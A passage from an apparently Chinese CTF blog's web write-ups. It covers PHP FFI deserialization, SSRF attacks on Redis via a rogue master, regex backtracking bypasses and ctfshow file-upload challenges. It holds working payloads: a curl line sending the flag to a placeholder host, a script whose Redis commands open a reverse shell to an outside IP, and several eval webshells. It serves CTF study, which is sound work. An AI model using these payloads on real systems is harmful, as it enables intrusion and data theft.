class="hljs-number">26</span>:<span class="hljs-string">&quot;int system(char *command);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>其次，对于获取到被赋值的data['ret']，最开始的时候我想的是直接修改源代码，将data属性修改为public，但是失败了var_dump查看之后，发现属性仍然为protected，查询了opache.preload，才发现preload.php已经被编译为opcode，我们修改文本是没有意义的。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161825562.png" alt="image-20220923161825562" /></p><p>于是重新构造payload，这回利用__serialize()能够返回data，最后成功构造payload。</p><p>最后是无回显的，当然这已经是小问题了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=unserialize(<span class="hljs-string">&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;</span>)-&gt;__serialize()[<span class="hljs-string">&#x27;ret&#x27;</span>]-&gt;system(<span class="hljs-string">&#x27;curl http://your-ip:port/`cat /flag | base64`&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="xss">10、XSS</h2><h2 id="ssrf">11、SSRF</h2><h3 id="网鼎ssrfmessrf-攻击redis协议">1、2020网鼎——SSRFMe（SSRF 攻击Redis协议）</h3><p>这道题最开始是一个PHP的一个内网过滤</p><p>先看一下SSRF的实现，经过分析可以得到以下的结论：</p><ol type="1"><li>仅开放了特定的协议，无法使用file协议或者其他PHP伪协议直接读取文件</li><li>增加了对于内网IP的检查</li><li>无法使用302跳转（libcurl默认也不支持302跳转）</li></ol><p>提示可以查看hint.php，那么第一步就是如何绕过内网IP的审查</p><p>方法一：使用libcurl和parse_url的解析差异，构造如下url，这个漏洞在7.4之后的PHP已经修复了。本题无法使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//user:passwd@127.0.0.1@baidu.com/hint.php</span><br></code></pre></td></tr></table></figure><p>方法二：畸形url绕过，构造如下url</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">///127.0.0.1</span><br></code></pre></td></tr></table></figure><p>方法三：使用0.0.0.0绕过，此法仅适用于linux</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//0.0.0.0</span><br></code></pre></td></tr></table></figure><p>方法四：DNS重绑定，TODO</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$match_result</span>=preg_match(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-variable">$url_parse</span>=parse_url(<span class="hljs-variable">$url</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$ip</span>=gethostbyname(<span class="hljs-variable">$hostname</span>);<br>    <span class="hljs-variable">$int_ip</span>=ip2long(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">return</span> ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (check_inner_ip(<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$result_info</span> = curl_getinfo(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])<br>        &#123;<br>            safe_request_url(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br>        var_dump(<span class="hljs-variable">$output</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>实现内网绕过后，hint.php提示Redis的密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    file_put_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>],<span class="hljs-string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>看到这里的时候，其实尝试过利用POST的file参数写木马，但是发现没有写权限。</p><p>类似的，redis也没办法直接写shell，因此考虑使用主从复制。</p><p>攻击逻辑其实就是利用SSRF使得redis将攻击机作为主机，从而利用主从复制将恶意的so文件加载，实现rce。</p><p>在VPS上搭建攻击机，可以参照 https://github.com/n0b0dyCN/redis-rogue-server。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401144412655.png" alt="image-20230401144412655" /></p><p>搭建成功之后，我们构造攻击脚本，此时的数据需要按照redis协议进行相关的编码，可以模仿上面的GitHub repo</p><p>需要注意的是，我们将对应的参数构造之后去攻击时，需要对gopher协议再次完成url编码。（url参数上传时会解析一次，libcurl会再次解析）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_format</span>(<span class="hljs-params">arr</span>):</span><br>    CRLF = <span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd += CRLF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x))) + CRLF + x<br>    cmd += CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_rce</span>(<span class="hljs-params">lhost, lport, passwd, command=<span class="hljs-string">&quot;cat /etc/passwd&quot;</span></span>):</span><br>    exp_filename = <span class="hljs-string">&quot;exp.so&quot;</span><br>    cmd = [<br>    <span class="hljs-comment"># 第一次</span><br>        <span class="hljs-string">&quot;CONFIG SET dir /tmp/&quot;</span>,<br>        <span class="hljs-string">&quot;config set dbfilename exp.so&quot;</span>,<br>        <span class="hljs-string">&quot;SLAVEOF &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(lhost, lport),<br><br><span class="hljs-comment"># 第二次</span><br>        <span class="hljs-string">&quot;MODULE LOAD /tmp/exp.so&quot;</span>,<br><br><span class="hljs-comment"># 第三次</span><br>        <span class="hljs-string">&quot;system.exec &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(command.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br><span class="hljs-comment"># 这里有个细节就是使用$&#123;IFS&#125;代替参数中的空格，因为上面的redis_format函数会根据空格来进行分割命令和参数</span><br><br>        <span class="hljs-string">&quot;system.rev 43.143.123.40$&#123;IFS&#125;7788&quot;</span>,<br>        <span class="hljs-string">&quot;SLAVEOF NO ONE&quot;</span>,<br>        <span class="hljs-string">&quot;CONFIG SET dbfilename dump.rdb&quot;</span>,<br>        <span class="hljs-string">&quot;system.exec rm$&#123;IFS&#125;/tmp/exp.so&quot;</span>,<br>        <span class="hljs-string">&quot;MODULE UNLOAD system&quot;</span>,<br>        <span class="hljs-string">&quot;quit&quot;</span>,<br><br>    ]<br>    <span class="hljs-keyword">if</span> passwd:<br>        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    lhost = <span class="hljs-string">&quot;43.143.123.40&quot;</span><br>    lport = <span class="hljs-string">&quot;7788&quot;</span><br><br>    rhost = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    rport = <span class="hljs-string">&quot;6379&quot;</span><br><br>    passwd = <span class="hljs-string">&quot;root&quot;</span><br><br>    payload = <span class="hljs-string">&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span>  + rport +  <span class="hljs-string">&quot;/_&quot;</span><br><br>    cmd = generate_rce(lhost, lport, passwd, command=<span class="hljs-string">&quot;cat /flag&quot;</span>)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cmd:<br>        a = redis_format(i)<br>        payload += quote(a)<br>    <br>    <span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><h2 id="正则相关">12、正则相关</h2><h3 id="正则最大回溯绕过">1、正则最大回溯绕过</h3><p>简单来说，对于php代码，正则库是依据NAF实现的，因此需要引入回溯机制。</p><p>php中设置了最大回溯次数，默认为10万次。</p><p>当正则表达式开启了贪心，我们就可以利用正则最大回溯次数的限制从而完成绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(show_source(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;./data/&#x27;</span>;<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (is_php(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @mkdir(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>);<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . random_int(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$path</span>);<br><br>    header(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>files = &#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-string">b&quot;&lt;?php file_put_contents(&#x27;hacker.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;); ?&gt;&quot;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">1000000</span>)<br>&#125;<br><br>url = <span class="hljs-string">&quot;http://5c447b18-7633-4d09-9eb7-d6caffed7c69.challenge.ctf.show/&quot;</span><br><br>r = requests.post(<br>    url=url,<br>    files=files,<br>    proxies=&#123;<br>        <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>    &#125;<br>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>NSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-upload-wp</title>
    <link href="/2022/04/11/blog0012-ctfshow-upload-wp/"/>
    <url>/2022/04/11/blog0012-ctfshow-upload-wp/</url>
    
    <content type="html"><![CDATA[<p>文件上传开始</p><span id="more"></span><h3 id="web151绕过前端校验">web151（绕过前端校验）</h3><p>前端校验要求传入的图片格式为<code>png</code></p><p>将<code>php</code>文件修改后缀为<code>png</code>，抓包重放修改为<code>php</code></p><p>蚁剑连接，成功打通</p><h3 id="web152绕过content-type">web152（绕过Content-Type）</h3><p>将Content-Type改为: <code>image/png</code></p><p>不过因为是抓包修改后缀，其实也无所谓。</p><h3 id="web153.user.ini">web153（.user.ini）</h3><p>首先是ban了<code>php</code>，爆破常见后缀名之后，发现基本都无法解析。</p><p>考虑上传<code>.user.ini</code>，然后先检查一下<code>upload</code>目录下是否存在PHP文件，发现存在PHP文件，于是上传两个文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//.user.ini</span><br>auto_append_file=<span class="hljs-number">1</span>.png<br>    <br><span class="hljs-comment">//1.png</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);highlight_file(<span class="hljs-keyword">__FILE__</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传文件之后，访问同目录下的php文件，实现了文件包含漏洞。</p><h3 id="web154文件内容校验">web154（文件内容校验）</h3><p>这道题在web153的基础上，对文件内容进行校验。关于PHP的一句话木马，我们往往有几种类似的表达。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//经典皮肤</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//开启short_open_tags=on</span><br><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//不需要开启参数</span><br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//低于7.0的版本</span><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);&lt;/script&gt;<br><br><span class="hljs-comment">//低于7.0的版本且开启asp_tags=on</span><br>&lt;% <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;%&gt;<br></code></pre></td></tr></table></figure><p>这道题我们直接选择第三种表达，剩下的步骤和web153一样。</p><h3 id="web155">web155</h3><p>同web154</p><h3 id="web156">web156</h3><p>过滤了[]，修改一句话木马为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>&#123;<span class="hljs-number">1</span>&#125;);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web157">web157</h3><p>增加过滤了分号和<code>&#123;&#125;</code></p><p>直接一句话读吧，ctfshow经典绕过各种过滤，有点小难受。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>system(<span class="hljs-string">&#x27;tac ../f*&#x27;</span>)<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?=</span>`tac ../f*`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web158">web158</h3><p>同web157，一把过。</p><h3 id="web159">web159</h3><p>同web157</p><h3 id="web160.user.ini包含逃逸">web160（.user.ini包含逃逸）</h3><p>这道题还是基于上面<code>.user.ini</code>的攻击思路，但是也需要类似逃逸的思路。</p><p>首先描述一下攻击思路：</p><p><strong>.user.ini（文件包含）--&gt; 上传1.png（rce，可控）--&gt; /upload/index.php 攻击</strong></p><p>但是当我们对文件内容进行较为严格的过滤时，我们可以考虑在<code>1.png</code>时继续文件包含，将<code>rce</code>的内容转移到新的文件中，于是我们重写<code>1.png</code>文件上传的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&#x27;/var/l&#x27;</span>.<span class="hljs-string">&#x27;og/n&#x27;</span>.<span class="hljs-string">&#x27;ginx/access.l&#x27;</span>.<span class="hljs-string">&#x27;og&#x27;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在日志中写入我们的一句话木马，成功实现<code>rce</code>。</p><h3 id="web161文件头检查绕过">web161（文件头检查绕过）</h3><p>这道题我们基本套路的和payload都和web160一致，但是需要在上传文件时，将文件头改为<code>GIF89a</code>，这是GIF文件头。</p><h3 id="web164png文件渲染">web164（PNG文件渲染）</h3><p>这道题我们首先上传一个普通的文件，发现能够查看，观察到<code>url</code>后有文件名，暗示有文件包含的漏洞。</p><p>尝试了<code>GIF89a</code>文件头，返回报错说只支持<code>PNG</code>，但是直接<code>PNG</code>打进去，看起来没什么可以过滤的点（这里附上后来打出来的源代码）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>    <span class="hljs-variable">$filesize</span> = (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filesize</span>&gt;<span class="hljs-number">1024</span>)&#123;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件大小不超1024KB&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//检查content-type头</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>)&#123;<br>            <span class="hljs-variable">$arr</span> = pathinfo(<span class="hljs-variable">$filename</span>);<br>            <span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br>            <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$ext_suffix</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;png&quot;</span>)))&#123;<br>                <span class="hljs-comment">//二次渲染png图片，随意的图片马会被清洗</span><br>                <span class="hljs-variable">$png</span> = imagecreatefrompng(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$png</span>==<span class="hljs-literal">FALSE</span>)&#123;<br>                    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件类型不合规&quot;</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$dst</span> = <span class="hljs-string">&#x27;upload/&#x27;</span>.md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>                    imagepng(<span class="hljs-variable">$png</span>,<span class="hljs-variable">$dst</span>);<br>                    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]).<span class="hljs-string">&quot;.png&quot;</span>);<br>                &#125;<br>            &#125;<span 